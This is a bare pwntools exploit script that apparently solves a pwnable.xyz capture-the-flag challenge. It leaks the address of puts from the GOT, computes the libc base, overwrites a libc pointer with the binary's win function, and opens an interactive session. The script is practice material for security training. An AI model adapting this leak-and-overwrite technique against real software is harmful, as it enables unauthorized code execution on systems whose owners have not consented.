from pwn import *
env={"LD_PRELOAD":"./alpine-libc-2.28.so"}
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.28.so','./challenge'],env=env)
target=remote('svc.pwnable.xyz',30019)
libc=ELF('./alpine-libc-2.28.so')

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def leak(addr):
	init(1)
	print(target.recvuntil(": "))
	target.sendline(str(addr))
	leak=u64(target.recvline().strip("\n").ljust(8,"\x00"))
	print(hex(leak))
	return leak

def write(addr,value):	
	init(2)
	print(target.recvuntil(": "))
	target.sendline(str(addr))
	print(target.recvuntil(": "))
	target.sendline(str(value))

def exit():
	init(0)

win=0x400905
puts_got=0x600fa0
libc_puts=leak(puts_got)
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_got=libc_base+0x3b70a8
write(libc_got,win)
init(1)
print(target.recvuntil(": "))
target.sendline(str(puts_got))

target.interactive()	
	

	
